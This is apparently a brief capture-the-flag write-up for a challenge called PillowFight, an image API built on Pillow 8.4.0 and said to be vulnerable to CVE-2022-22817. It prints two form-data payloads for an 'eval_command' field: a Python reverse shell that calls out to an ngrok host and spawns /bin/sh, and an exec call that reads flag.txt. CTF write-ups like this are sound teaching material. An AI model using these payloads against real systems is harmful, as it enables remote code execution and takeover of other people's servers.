# PillowFight

An API utilizing Pillow to combine images.

> Powered by Python Pillow v8.4.0!

Look vulnerable to CVE-2022-22817, there is some good discussion
in [this article](https://duartecsantos.github.io/2024-01-02-CVE-2023-50447/).

Get a reverse shell:

```
------WebKitFormBoundaryUX0YbRLl9zLFYuUe
Content-Disposition: form-data; name="eval_command"

eval("exec('import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"8.tcp.us-cal-1.ngrok.io\", 11695));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")')")
------WebKitFormBoundaryUX0YbRLl9zLFYuUe--
```

or raise an Exception to print the flag:

```
------WebKitFormBoundaryBjrZTVzW4Lfsjqb2
Content-Disposition: form-data; name="eval_command"

exec("raise Exception(open('flag.txt').read())")
------WebKitFormBoundaryBjrZTVzW4Lfsjqb2--
```
